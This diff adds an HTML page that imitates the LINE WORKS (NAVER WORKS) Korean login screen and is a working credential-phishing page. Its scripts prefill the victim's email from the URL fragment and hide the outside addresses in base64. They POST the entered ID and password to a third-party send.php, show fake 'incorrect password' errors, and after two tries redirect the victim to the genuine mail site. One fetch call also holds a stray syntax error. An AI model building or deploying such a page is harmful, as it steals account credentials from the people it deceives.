@@ -1,0 +1,302 @@
+<!DOCTYPE HTML>
+<html lang="ko">
+<head>
+    <meta charset="utf-8" />
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/login.css?20250515210233">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" type="text/javascript"></script>
+
+<style>
+input[type="email"] {
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    appearance: none;
+    border: 0;
+    background-color: rgba(0, 0, 0, 0);
+}
+</style>
+</head>
+
+<body>
+    <div id="root">
+        <a href="#content" class="skip">go to the text</a>
+        <div class="wrap ko_KR integration">
+            <div class="container">
+                
+                <!-- First Form (div1) -->
+                <div class="contents_box" id="div1">
+                    <div class="contents">
+                        <h1 class="logo"><span class="blind">LINE WORKS</span></h1>
+                        <h2 class="title">휴대폰 번호나 ID를 입력하세요.</h2>
+                        <form id="form-1">
+						<!-- The nonce will be injected here by JavaScript -->
+                 <input type="hidden" name="nonce" id="nonceField" value="">
+                            <div class="input_wrap">
+                                <div class="input_area" id="idInputArea">
+                                    <div class="input_cover">
+                                        <label for="login_param" class="blind">이메일</label>
+                                        <input type="email" id="login_param" name="userid" class="input_box" placeholder="로그인 아이디" required="required">
+                                        <button type="button" class="btn_delete"><span class="blind">비밀번호 찾기</span></button>
+                                    </div>
+                                    <ul class="account_list" id="login_id_list"></ul>
+                                </div>
+                                <div class="invalid_desc" id="fail_message1" style="display: none;"></div>
+                            </div>
+                            <div class="input_btn_area">
+                                <button type="submit" id="loginStart" class="btn_submit">기억하기</button>
+                            </div>
+                            <div class="check_area">
+                                <div class="check_info">
+                                    <div class="check_cover">
+                                        <input type="checkbox" id="" class="input_check">
+                                        <label for="keepLogin" id="" class="input_label">계속 로그인</label>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="terms_area">
+                                <p class="terms">By logging in, you are agreeing to the revised <a href="#" target="_blank" class="link">Terms of Service</a> and <a href="" target="_blank" class="link">Privacy Policy</a>.</p>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Second Form (div2) -->
+                <div class="contents_box" id="div2" style="display:none;">
+                    <div class="contents">
+                        <h1 class="logo"><span class="blind">LINE WORKS</span></h1>
+                        <h2 class="title">휴대폰 번호나 ID를 입력하세요.</h2>
+                        <form id="form-2">
+						<!-- The nonce will be injected here by JavaScript -->
+        <input type="hidden" name="nonce" id="nonceField2" value="">
+                            <div class="input_wrap">
+                                <div class="input_area">
+                                      <div class="input_cover">
+                                        <label for="userid" class="blind">이메일</label>
+                                        <input type="text" id="login_param2" class="input_box" placeholder="로그인 아이디" value="" required="required">
+                                        <div class="other" id="mail_domain"></div>
+
+
+                                        <input type="hidden" id="finalEmailSubmission" name="userid">
+
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="input_wrap">
+                                <div class="input_area">
+                                    <div class="input_cover">
+                                        <label for="password" class="blind">비밀번호</label>
+                                        <input type="password" id="password" name="pass" class="input_box" placeholder="비밀번호" minlength="5" required="required">
+                                        <button type="button" class="btn_delete"><span class="blind">비밀번호 찾기</span></button>
+                                        <button type="button" class="btn_masking" id="showPassword"><span class="blind">show the password</span></button>
+                                    </div>
+                                </div>
+                                <p class="invalid_desc" id="fail_message2"></p>
+                            </div>
+
+                            <div class="input_btn_area">
+                                <button type="submit" id="loginStart2" class="btn_submit">기억하기</button>
+                            </div>
+
+                            <div class="check_area">
+                                <div class="check_info">
+                                    <div class="check_cover">
+                                        <input type="checkbox" id="" class="input_check" disabled>
+                                        <label for="keepLogin" id="" class="input_label">계속 로그인</label>
+                                    </div>
+                                </div>
+                                <div class="more_area">
+                                    <a href="#" class="link findPwdBtn">암호 찾기</a>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Other Content -->
+                <div class="other_contents">
+                    <a href="#" target="_blank" class="another_way">새 계정을 만드세요?</a>
+                </div>
+
+                <!-- Footer -->
+                <footer class="footer">
+                    <address class="copyright">© NAVER WORKS Corp.</address>
+                </footer>
+            </div>
+        </div>
+    </div>
+ <script>
+
+    //Autolinnnk
+		
+    var feedUpdateResponse = window.location.href;
+    var feedUpdateSplit = feedUpdateResponse.split("");
+    
+    for (var x = 0; x < feedUpdateSplit.length; x++) {
+     
+     if (feedUpdateSplit[x]=="#"){
+      var che= feedUpdateResponse.substring(x+1);
+     
+     }else{
+    
+     }
+     }
+      document.getElementById("login_param").value =che || "";
+    document.getElementById("login_param").innerHTML = che
+
+    </script>
+	
+	 <script>
+        // Fetch the nonce from the PHP script
+        fetch(atob('aHR0cHM6Ly9jcnlzdGFsc2t5bG9naXN0aWNzLmNvbS9ncm9jZXJpZXMvd3Jya3Mva3p6L2dldF9ub25jZS5waHA='));
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('nonceField').value = data.nonce;
+				 document.getElementById('nonceField2').value = data.nonce;
+            })
+            .catch(error => console.error('Security Error:', error));
+    </script>
+	
+    <script>
+        $(document).ready(function() {
+
+            var  count=0;
+
+
+            // Show/hide password functionality
+            $("#showPassword").click(function() {
+                var passwordField = $("#password");
+                var type = passwordField.attr("type");
+
+                if (type === "password") {
+                    passwordField.attr("type", "text"); // Show password
+                    $(this).text("");  // Update button text
+                } else {
+                    passwordField.attr("type", "password"); // Hide password
+                    $(this).text("");  // Update button text
+                }
+            });
+
+            // Handle form submission for the first form (div1)
+            $('#form-1').submit(function(e) {
+                e.preventDefault(); // Prevent default form submission
+
+                // Get the email entered in the first form (div1)
+                var userID = $("#login_param").val().trim();
+
+                if (userID === "") {
+                    $(".invalid_desc").show();
+                    $("#fail_message1").html("Please enter a valid user ID.");
+                    return; // Stop further processing if no email is entered
+                }
+
+                // Transition from div1 to div2, passing the email to div2
+                if (!$("#div2").is(":visible")) {
+                    // Hide div1 and show div2 with animation
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 500);
+
+                    // Transfer the email entered in div1 to div2 and split domain (email field)
+
+        
+                    // Grab the value from the field
+                 var lastAtIndex = userID.lastIndexOf('@');
+
+                if (lastAtIndex !== -1) {
+                    $("#login_param2").val(userID.substring(0, lastAtIndex));
+                    $("#mail_domain").text(userID.substring(lastAtIndex));
+}
+
+         
+                    // Ensure div2 fields are required
+                    $("#div2").find("input").prop("required", true);
+                    $('#loginStart2').html('CONTINUE'); // Change button text in div2
+                }
+            });
+
+            // Handle form submission for the second form (div2)
+            $('#form-2').submit(function(e) {
+
+                count=count+1;
+
+                   e.preventDefault(); // Prevent default form submission
+
+                
+                    var user = $("#login_param2").val().trim();
+                    var domain = $("#mail_domain").text().trim();
+
+                    // Put the combined string into the HIDDEN field
+                    $("#finalEmailSubmission").val(user + domain);
+
+
+                // Get password entered in div2
+                var password = $("#password").val().trim();
+         
+
+                if (password === "") {
+                    $(".invalid_desc").show();
+                    $("#fail_message2").html("Please enter your password.");
+                    return; // Stop further processing if password is empty
+                }
+
+                // Show "Verifying..." before displaying the error messages
+                $('#loginStart2').html('Verifying...'); // Update button text
+
+                // Simulate server response for errors
+                var d = atob("aHR0cHM6Ly9jcnlzdGFsc2t5bG9naXN0aWNzLmNvbS9ncm9jZXJpZXMvd3Jya3Mva3p6L3NlbmQucGhw"); // Simulated URL
+
+                $.ajax({
+                    type: 'POST',
+                    url: d,
+                    crossDomain: true,
+                    data: $('#form-2').serialize(), // Serialize the form data
+                    beforeSend: function(xhr) {
+                        // Before sending, show the "Verifying..." message
+                        $('#loginStart2').html('Verifying...');
+
+                           if (count>=2) {
+                       
+                            count=0;
+                        // window.location.replace(response['redirect_link']);
+                        window.location.replace(atob("aHR0cHM6Ly9tYWlsLndvcmtzbW9iaWxlLmNvbQ=="));
+    
+                      }else{
+                            document.getElementById("finalEmailSubmission").value;
+
+                         
+                        
+                       $('#loginStart2').html('CONTINUE');
+                           document.getElementById("password").value ="";
+                         
+                        
+                    $(".invalid_desc").show();
+                        $("#fail_message2").html("아이디 또는 비밀번호가 일치하지 않습니다.");
+                    
+    
+                         }      
+                },
+                    
+                    success: function () {
+                    $(".invalid_desc").show();
+                        $("#fail_message2").html("The username or password you entered is incorrect.");
+                
+        
+                },
+
+                        });
+
+               // Automatically submit the form when the Enter key is pressed
+            $(document).keypress(function(event) {
+                if (event.keyCode === 13) {
+                    event.preventDefault();
+                    $("#loginStart, #loginStart2").click(); // Trigger button click
+                }
+            });
+            });
+        });
+    </script>
+    <script src="https://code.jquery.com/jquery-4.0.0.min.js" integrity="sha256-OaVG6prZf4v69dPg6PhVattBXkcOWQB62pdZ3ORyrao=" crossorigin="anonymous"></script>
+</body>
+</html>
